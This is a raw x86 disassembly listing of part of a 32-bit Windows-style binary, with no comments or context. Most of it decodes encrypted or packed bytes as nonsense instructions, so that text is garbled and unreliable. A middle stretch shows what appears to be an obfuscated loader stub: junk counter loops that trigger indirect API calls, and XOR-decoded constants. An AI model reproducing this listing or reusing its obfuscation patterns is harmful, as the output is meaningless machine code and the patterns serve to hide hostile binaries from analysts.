  40b26e:	out    0xd5,eax
  40b270:	xchg   ebp,eax
  40b271:	lahf   
  40b272:	mov    ebx,0x964b366e
  40b277:	xchg   ebx,eax
  40b278:	or     dh,BYTE PTR [ecx]
  40b27a:	loopne 0x40b23c
  40b27c:	jmp    0x9acde2d9
  40b281:	pop    es
  40b282:	into   
  40b283:	add    bh,BYTE PTR [esi+0x23]
  40b286:	sub    DWORD PTR [edx+0x25fee7ee],0x96fa7e83
  40b290:	test   DWORD PTR [ebp-0xdf45ffa],edx
  40b296:	mov    bh,0x60
  40b298:	scas   eax,DWORD PTR es:[edi]
  40b299:	(bad)
  40b29c:	dec    eax
  40b29d:	push   0xd07140de
  40b2a2:	jl     0x40b2ad
  40b2a4:	cmp    dh,ch
  40b2a6:	sub    ebx,DWORD PTR [eax-0x4baa2c3f]
  40b2ac:	sbb    BYTE PTR [ecx-0x31],dl
  40b2af:	jnp    0x40b246
  40b2b1:	sbb    edx,DWORD PTR [edx+edx*4]
  40b2b4:	inc    ebx
  40b2b5:	stos   BYTE PTR es:[edi],al
  40b2b6:	xor    eax,edi
  40b2b8:	dec    edi
  40b2b9:	repz mov esi,0xf9322181
  40b2bf:	lahf   
  40b2c0:	adc    DWORD PTR [ebx],eax
  40b2c2:	cmp    eax,0x3eb7769f
  40b2c7:	dec    ecx
  40b2c8:	adc    ebx,DWORD PTR [ecx]
  40b2ca:	xchg   ebp,eax
  40b2cb:	adc    ch,BYTE PTR ds:0x7e13df5f
  40b2d1:	sub    ch,BYTE PTR [ebp+edi*8-0x35e55bb6]
  40b2d8:	jl     0x40b29f
  40b2da:	push   eax
  40b2db:	retf   0x4319
  40b2de:	mov    al,ds:0xf6d480ed
  40b2e3:	inc    ebx
  40b2e4:	das    
  40b2e5:	imul   bh
  40b2e7:	push   edx
  40b2e8:	repz test dl,0xa8
  40b2ec:	adc    DWORD PTR [ebx+ebx*4+0x5997e5cc],esp
  40b2f3:	pop    edx
  40b2f4:	mov    ds:0xefcb47a,al
  40b2f9:	das    
  40b2fa:	cmp    eax,0xbb47e9eb
  40b2ff:	and    dl,dh
  40b301:	xlat   BYTE PTR ds:[ebx]
  40b302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b303:	xchg   edx,eax
  40b304:	test   ebx,ecx
  40b306:	js     0x40b37b
  40b308:	push   eax
  40b309:	(bad)  
  40b30a:	arpl   WORD PTR [eax],bp
  40b30c:	fistp  DWORD PTR [edi-0x42]
  40b30f:	daa    
  40b310:	jnp    0x40b383
  40b312:	mov    edi,0x803d573a
  40b317:	jno    0x40b2d5
  40b319:	xchg   ecx,eax
  40b31a:	nop
  40b31b:	test   DWORD PTR [esi+0x572ca83c],ecx
  40b321:	(bad)  
  40b323:	inc    ebx
  40b324:	and    eax,0x54a9afb4
  40b329:	mov    edx,0xd5ef25e8
  40b32e:	xchg   BYTE PTR [ebx],ah
  40b330:	xchg   esp,eax
  40b331:	or     al,BYTE PTR [eax]
  40b333:	push   ebx
  40b334:	push   esp
  40b335:	mov    eax,ds:0x294e0e1e
  40b33a:	pusha  
  40b33b:	inc    eax
  40b33c:	pop    ebp
  40b33d:	mov    edi,0x55efd273
  40b342:	je     0x40b3a1
  40b344:	shl    DWORD PTR [esi-0x15],cl
  40b347:	xlat   BYTE PTR ds:[ebx]
  40b348:	jg     0x40b32c
  40b34a:	adc    al,0xdb
  40b34c:	and    dh,ah
  40b34e:	mov    ecx,0x97052fbb
  40b353:	mov    eax,0x3d06bb9d
  40b358:	imul   ecx,DWORD PTR [eax-0x2b79224],0xff851ac3
  40b362:	das    
  40b363:	and    ah,bh
  40b365:	pop    ecx
  40b366:	pop    edi
  40b367:	mov    al,0x27
  40b369:	add    eax,0xedc9c3d8
  40b36e:	in     eax,dx
  40b36f:	push   eax
  40b370:	lods   eax,DWORD PTR ds:[esi]
  40b371:	or     cl,BYTE PTR [ebx+0x43]
  40b374:	pushf  
  40b375:	fidiv  DWORD PTR [edx+0x18a89962]
  40b37b:	ret    0xadbc
  40b37e:	cdq    
  40b37f:	nop
  40b380:	mov    DWORD PTR [esi+ecx*4-0x29],esp
  40b384:	scas   eax,DWORD PTR es:[edi]
  40b385:	mov    ebp,0xe057d0e6
  40b38a:	mov    esi,0xc4383a20
  40b38f:	ds xor edx,ebx
  40b392:	(bad)  
  40b393:	xchg   esi,eax
  40b394:	or     BYTE PTR [ebp+0x32],cl
  40b397:	jge    0x40b3f5
  40b399:	scas   eax,DWORD PTR es:[edi]
  40b39a:	mov    edi,0xc188c9d2
  40b39f:	mov    BYTE PTR ds:0x88c3cabd,ah
  40b3a5:	xchg   ebp,eax
  40b3a6:	xor    bh,al
  40b3a8:	push   ds
  40b3a9:	mov    esi,0x4fd9588f
  40b3ae:	ror    ah,cl
  40b3b0:	jmp    0x883a3af7
  40b3b5:	sbb    eax,0x2086125e
  40b3ba:	and    edi,ecx
  40b3bc:	ret    0xba9a
  40b3bf:	shr    BYTE PTR ds:0x48820a33,0xd3
  40b3c6:	jns    0x40b38b
  40b3c8:	(bad)  
  40b3c9:	or     eax,0xe8613021
  40b3ce:	lods   al,BYTE PTR ds:[esi]
  40b3cf:	out    dx,al
  40b3d0:	or     DWORD PTR es:[ebp+0x50],ecx
  40b3d4:	and    DWORD PTR [edx],esi
  40b3d6:	mov    dl,0x92
  40b3d8:	xchg   ebp,esp
  40b3da:	outs   dx,BYTE PTR ds:[esi]
  40b3db:	dec    eax
  40b3dc:	aaa    
  40b3dd:	xchg   edi,eax
  40b3de:	mov    bh,0x3a
  40b3e0:	cmp    BYTE PTR [edx+0x2b],dl
  40b3e3:	pop    esi
  40b3e4:	jg     0x40b419
  40b3e6:	jbe    0x40b3ad
  40b3e8:	cmp    al,0xd1
  40b3ea:	lea    ebx,[edx+0x53]
  40b3ed:	hlt    
  40b3ee:	dec    ecx
  40b3ef:	in     eax,dx
  40b3f0:	or     bl,BYTE PTR [eax-0x13]
  40b3f3:	shl    BYTE PTR [eax+0x64],1
  40b3f6:	ja     0x40b454
  40b3f8:	and    DWORD PTR [ecx],esp
  40b3fa:	js     0x40b410
  40b3fc:	push   ds
  40b3fd:	xchg   DWORD PTR [edi+ebx*1+0x29],ecx
  40b401:	pusha  
  40b402:	mov    ah,0x5d
  40b404:	jo     0x40b459
  40b406:	sbb    BYTE PTR [ebx],ah
  40b408:	das    
  40b409:	add    dl,BYTE PTR [eax-0x5e97ebb0]
  40b40f:	sar    eax,cl
  40b411:	inc    esp
  40b412:	adc    al,0xb3
  40b414:	add    ah,BYTE PTR [esi-0x64329ad9]
  40b41a:	sub    al,0xb5
  40b41c:	xchg   ebx,eax
  40b41d:	dec    ebp
  40b41e:	inc    ebx
  40b41f:	inc    edi
  40b420:	icebp  
  40b421:	pop    ecx
  40b422:	dec    ebp
  40b423:	inc    ebp
  40b424:	cmp    dl,dh
  40b426:	(bad)  
  40b427:	push   edi
  40b428:	add    edx,DWORD PTR [ecx-0x7d]
  40b42b:	xchg   edx,eax
  40b42c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b42d:	popf   
  40b42e:	mov    al,ah
  40b430:	push   esi
  40b431:	cs retf 0x63a8
  40b435:	adc    DWORD PTR [edi-0x31],edi
  40b438:	sub    DWORD PTR [eax-0x33],edi
  40b43b:	gs cmp eax,0x8106e16c
  40b441:	mov    edx,0x7e7bd9f8
  40b446:	inc    edx
  40b447:	aaa    
  40b448:	mov    BYTE PTR [eax+0x26],al
  40b44b:	cli    
  40b44c:	push   eax
  40b44d:	and    eax,0xbc086713
  40b452:	inc    ebp
  40b453:	jle    0x40b49d
  40b455:	(bad)  
  40b456:	int    0x30
  40b458:	stos   DWORD PTR es:[edi],eax
  40b459:	cmp    eax,0x26dd612c
  40b45e:	stos   DWORD PTR es:[edi],eax
  40b45f:	pushf  
  40b460:	push   ebx
  40b461:	div    DWORD PTR [eax-0xa]
  40b464:	jae    0x40b4e1
  40b466:	push   ebp
  40b467:	xor    edi,DWORD PTR [ecx+0x30]
  40b46a:	sub    eax,0x7da67acb
  40b46f:	mov    esp,cs
  40b471:	sub    al,0x3d
  40b473:	jle    0x40b444
  40b475:	fbld   TBYTE PTR fs:[ecx-0x6133d06a]
  40b47c:	pop    ss
  40b47d:	fs and DWORD PTR ss:[ebx+0x799de932],esi
  40b485:	scas   eax,DWORD PTR es:[edi]
  40b486:	push   DWORD PTR [ebx]
  40b488:	or     ah,BYTE PTR [edx+0x16]
  40b48b:	je     0x40b4f2
  40b48d:	or     bl,BYTE PTR [ebx]
  40b48f:	(bad)  
  40b490:	hlt    
  40b491:	in     eax,0x7d
  40b493:	sbb    eax,0x312b39fd
  40b498:	dec    ebp
  40b499:	pop    edx
  40b49a:	dec    ebp
  40b49b:	cmp    BYTE PTR [esi+0x2f],cl
  40b49e:	push   edx
  40b49f:	jnp    0x40b4ec
  40b4a1:	mov    bl,0x72
  40b4a3:	or     esp,esp
  40b4a5:	mov    ah,0x61
  40b4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a8:	loopne 0x40b493
  40b4aa:	jbe    0x40b4f3
  40b4ac:	js     0x40b524
  40b4ae:	fmul   DWORD PTR [ebp+0x74ea77e2]
  40b4b4:	iret   
  40b4b5:	pop    esi
  40b4b6:	imul   eax,DWORD PTR [edx],0x4bf91b7c
  40b4bc:	pop    esi
  40b4bd:	push   ss
  40b4be:	out    0x4,eax
  40b4c0:	jg     0x40b489
  40b4c2:	sub    ebx,DWORD PTR [ebx]
  40b4c4:	add    bl,BYTE PTR [ebp+ecx*2+0xc]
  40b4c8:	cmp    ebp,DWORD PTR [edi+0x49]
  40b4cb:	(bad)  
  40b4cd:	jo     0x40b4ad
  40b4cf:	rcl    ebp,1
  40b4d1:	dec    ebx
  40b4d2:	ret    
  40b4d3:	push   0x92a8350b
  40b4d8:	inc    edx
  40b4d9:	pop    ebp
  40b4da:	outs   dx,DWORD PTR ds:[esi]
  40b4db:	in     eax,dx
  40b4dc:	dec    esi
  40b4dd:	adc    al,0xf
  40b4df:	jne    0x40b498
  40b4e1:	daa    
  40b4e2:	or     bh,BYTE PTR ds:0x54df28ce
  40b4e8:	ja     0x40b54d
  40b4ea:	hlt    
  40b4eb:	enter  0x6a4d,0x31
  40b4ef:	dec    edi
  40b4f0:	mov    dh,0x88
  40b4f2:	fld    DWORD PTR [edx]
  40b4f4:	cmp    bh,BYTE PTR [ebx]
  40b4f6:	mov    ebp,DWORD PTR [edi+0x1c6192b9]
  40b4fc:	pop    ss
  40b4fd:	cmp    al,BYTE PTR ds:0x79aeee82
  40b503:	adc    DWORD PTR [ebx+0x2],edi
  40b506:	ins    DWORD PTR es:[edi],dx
  40b507:	(bad)  
  40b509:	add    BYTE PTR [esi],0x43
  40b50c:	jmp    0x826eeac8
  40b511:	adc    dh,BYTE PTR [eax+ebp*4+0x6c]
  40b515:	fmulp  st(5),st
  40b517:	mov    eax,ds:0x32112f1b
  40b51c:	ret    0x5f45
  40b51f:	sbb    BYTE PTR [edi-0x46],bh
  40b522:	ret    0xbe14
  40b525:	inc    edi
  40b526:	xor    BYTE PTR [edi],0xea
  40b529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b52a:	xlat   BYTE PTR ds:[ebx]
  40b52b:	jo     0x40b5a5
  40b52d:	popa   
  40b52e:	mov    esi,0x9ee321fa
  40b533:	pop    ecx
  40b534:	xor    esp,ebp
  40b536:	xor    BYTE PTR [ebp-0x6bf3fd92],ah
  40b53c:	aas    
  40b53d:	push   ebx
  40b53e:	xor    eax,0xd47e0c97
  40b543:	arpl   WORD PTR [ebx-0x38],dx
  40b546:	cs addr16 mov bl,0x6b
  40b54a:	loope  0x40b556
  40b54c:	mov    bh,0x4e
  40b54e:	sbb    ecx,DWORD PTR [ebx-0x77]
  40b551:	ror    DWORD PTR [eax+0x7213ff93],cl
  40b557:	je     0x40b576
  40b559:	in     eax,0xfa
  40b55b:	and    esi,DWORD PTR [edi-0x47d79091]
  40b561:	dec    edi
  40b562:	ins    DWORD PTR es:[edi],dx
  40b563:	xchg   ecx,eax
  40b564:	push   ebx
  40b565:	in     al,dx
  40b566:	mov    ecx,DWORD PTR [ecx]
  40b568:	add    edi,ebx
  40b56a:	sub    edi,ebp
  40b56c:	addr16 (bad) 
  40b56e:	jl     0x40b546
  40b570:	jmp    0x40b5cc
  40b572:	sub    DWORD PTR [ecx],esi
  40b574:	xor    DWORD PTR [ebx+ebx*8],0x10
  40b578:	(bad)  
  40b579:	jnp    0x40b524
  40b57b:	mov    ebp,0xb8d68156
  40b580:	sub    DWORD PTR [eax],eax
  40b582:	add    BYTE PTR [edi+0xb],dl
  40b585:	cmp    eax,0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x421792
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x42199a
  40b629:	mov    ecx,DWORD PTR ds:0x42170a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x4235ce
  40b674:	push   0x42354e
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421912
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x423529
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x423540
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421932
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x421888
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x9d896403
  40b9b7:	mov    ds:0x62f44f15,al
  40b9bc:	bound  ecx,QWORD PTR [edx]
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx+0x21]
  40b9c2:	(bad)  
  40b9c4:	mov    esi,0x3991bbdb
  40b9c9:	lods   al,BYTE PTR ds:[esi]
  40b9ca:	jl     0x40b9d7
  40b9cc:	loopne 0x40ba43
  40b9ce:	mov    ds:0xdf31eb4c,eax
  40b9d3:	aaa    
  40b9d4:	cdq    
  40b9d5:	shl    BYTE PTR [eax-0x7c1e3a52],1
  40b9db:	lock fbld TBYTE PTR [eax-0x3dbe9fd1]
  40b9e2:	sbb    al,0xbb
  40b9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e5:	aam    0xb
  40b9e7:	xor    ch,bl
  40b9e9:	dec    eax
  40b9ea:	cdq    
  40b9eb:	bts    DWORD PTR [ebx+0x50],esi
  40b9ef:	rcl    DWORD PTR [esi+edx*8-0x3990d0cb],cl
  40b9f6:	ffree  st(7)
  40b9f8:	ds retf 0x8148
  40b9fc:	repnz pop esi
  40b9fe:	mov    WORD PTR [edx],?
  40ba00:	shl    BYTE PTR [ecx+0x16],0x3a
  40ba04:	jo     0x40ba7d
  40ba06:	out    dx,al
  40ba07:	push   ebp
  40ba08:	ret    0xa825
  40ba0b:	sub    DWORD PTR [edx],0x7c
  40ba0e:	mov    eax,ds:0x88a51eb7
  40ba13:	out    dx,eax
  40ba14:	or     bl,BYTE PTR [esi-0x7c]
  40ba17:	xor    dl,BYTE PTR [ebx+0x7a]
  40ba1a:	pop    esp
  40ba1b:	loop   0x40ba96
  40ba1d:	xor    dh,BYTE PTR [edi+0x5529a00f]
  40ba23:	std    
  40ba24:	or     edx,DWORD PTR [edx+eiz*1-0x44]
  40ba28:	xor    BYTE PTR [edi-0x97a81a0],ah
  40ba2e:	or     BYTE PTR [ebx],ah
  40ba30:	(bad)  
  40ba31:	push   ss
  40ba32:	sti    
  40ba33:	jecxz  0x40ba11
  40ba35:	xor    DWORD PTR [ecx],edx
  40ba37:	mov    DWORD PTR [eax],ebp
  40ba39:	push   ebp
  40ba3a:	scas   al,BYTE PTR es:[edi]
  40ba3b:	aam    0x6
  40ba3d:	(bad)  
  40ba3e:	sbb    eax,0xb6e6f826
  40ba43:	push   es
  40ba44:	xor    BYTE PTR [edi],bh
  40ba46:	inc    esi
  40ba47:	jb     0x40ba89
  40ba49:	pushf  
  40ba4a:	adc    dh,BYTE PTR [ecx+0x3f370489]
  40ba50:	loopne 0x40bab3
  40ba52:	ror    BYTE PTR [ecx-0x1da49991],cl
  40ba58:	sub    bl,ah
  40ba5a:	lea    esi,[eax]
  40ba5c:	pop    edi
  40ba5d:	loop   0x40ba00
  40ba5f:	mov    eax,ds:0x76e9c860
  40ba64:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40ba66:	(bad)  
  40ba67:	ins    BYTE PTR es:[edi],dx
  40ba68:	xchg   esp,eax
  40ba69:	int3   
  40ba6a:	pop    gs
  40ba6c:	mov    esp,0xb32db731
  40ba71:	and    BYTE PTR [ebx+0x70],ch
  40ba74:	aaa    
  40ba75:	dec    ecx
  40ba76:	sbb    esi,DWORD PTR [edx]
  40ba78:	(bad)  
  40ba79:	or     edi,ebx
  40ba7b:	jb     0x40ba92
  40ba7d:	and    esi,esp
  40ba7f:	popf   
  40ba80:	enter  0xec86,0x58
  40ba84:	or     esp,DWORD PTR [esp+edx*8+0x136fff55]
  40ba8b:	aad    0x0
  40ba8d:	ins    DWORD PTR es:[edi],dx
  40ba8e:	jne    0x40baa9
  40ba90:	lods   eax,DWORD PTR ds:[esi]
  40ba91:	or     ecx,eax
  40ba93:	xchg   ecx,eax
  40ba94:	mov    ds:0xae9bb9b3,al
  40ba99:	std    
  40ba9a:	mov    al,ds:0x880d39fa
  40ba9f:	pop    ebx
  40baa0:	leave  
  40baa1:	fwait
  40baa2:	lea    ecx,[ecx]
  40baa4:	push   0x9d2dc492
  40baa9:	dec    edx
  40baaa:	(bad)  
  40baab:	mov    eax,es
  40baad:	imul   eax,DWORD PTR [esi-0x287af6dc],0xffffff83
  40bab4:	pop    esi
  40bab5:	(bad)  
  40bab6:	lods   eax,DWORD PTR ds:[esi]
  40bab7:	dec    edx
  40bab8:	mov    ebp,0xb8ade643
  40babd:	push   0xd4cc5435
  40bac2:	scas   al,BYTE PTR es:[edi]
  40bac3:	jnp    0x40bb33
  40bac5:	ds ss pop es
  40bac8:	xor    ch,bl
  40baca:	push   edi
  40bacb:	xchg   ebp,eax
  40bacc:	xor    bh,BYTE PTR [eax+0x277d04ad]
  40bad2:	dec    ebx
  40bad3:	sbb    dl,BYTE PTR [edi]
  40bad5:	jmp    0xf730c713
  40bada:	dec    ebx
  40badb:	out    dx,al
  40badc:	sbb    edi,DWORD PTR [edi+0xeb88cd0]
  40bae2:	stos   BYTE PTR es:[edi],al
  40bae3:	mov    esp,DWORD PTR [ecx-0x1]
  40bae6:	imul   edi,DWORD PTR [eax+0x74be881f],0x915190c6
  40baf0:	xor    ebp,eax
  40baf2:	dec    eax
  40baf3:	cmc    
  40baf4:	ja     0x40bac5
  40baf6:	pop    ss
  40baf7:	push   0xffffffaf
  40baf9:	sub    BYTE PTR [esi],0x82
  40bafc:	(bad)  
  40bafd:	jp     0x40baff
  40baff:	xchg   ebx,eax
  40bb00:	pop    esp
  40bb01:	test   al,0x69
  40bb03:	jecxz  0x40bb7f
  40bb05:	nop
  40bb06:	retf   0xd2e8
  40bb09:	stos   BYTE PTR es:[edi],al
  40bb0a:	bound  edx,QWORD PTR [edi+0x77548a0b]
  40bb10:	test   ch,dh
  40bb12:	test   eax,0x134beb50
  40bb17:	je     0x40ba9a
  40bb19:	mov    ds:0x8ae40f6f,al
  40bb1e:	cld    
  40bb1f:	mov    eax,ds:0x5bd1d1ae
  40bb24:	push   eax
  40bb25:	mov    esp,0x28480c47
  40bb2a:	mul    BYTE PTR [esi]
  40bb2c:	cmp    BYTE PTR [ebx+0x59],dl
  40bb2f:	add    eax,0x6700d1d2
  40bb34:	arpl   WORD PTR [ecx+0x22],bx
  40bb37:	test   al,0x52
  40bb39:	pop    ss
  40bb3a:	xchg   esi,eax
  40bb3b:	pop    eax
  40bb3c:	mov    dl,0xe
  40bb3e:	xchg   esp,eax
  40bb3f:	ret    0x6254
  40bb42:	jae    0x40bb41
  40bb44:	inc    eax
  40bb45:	xor    eax,0xc4b042eb
  40bb4a:	and    al,0x69
  40bb4c:	sbb    BYTE PTR [edx+0x5cc562a3],0xe
  40bb53:	xchg   esi,eax
  40bb54:	int3   
  40bb55:	push   es
  40bb56:	sbb    WORD PTR [esi-0x15],0x7
  40bb5b:	mov    al,ds:0xc9751340
  40bb60:	and    ebx,DWORD PTR ds:0x2ceb5592
  40bb66:	outs   dx,DWORD PTR ds:[esi]
  40bb67:	fisub  DWORD PTR [ecx]
  40bb69:	es jae 0x40bb25
  40bb6c:	xor    ebp,eax
  40bb6e:	inc    esi
  40bb6f:	sub    cl,BYTE PTR [edi+eax*8-0x2c0bc1c6]
  40bb76:	ret    
  40bb77:	mov    esi,0x5f9a1ca0
  40bb7c:	push   es
  40bb7d:	mov    dh,0xdd
  40bb7f:	call   0x6198:0x71b3f6d1
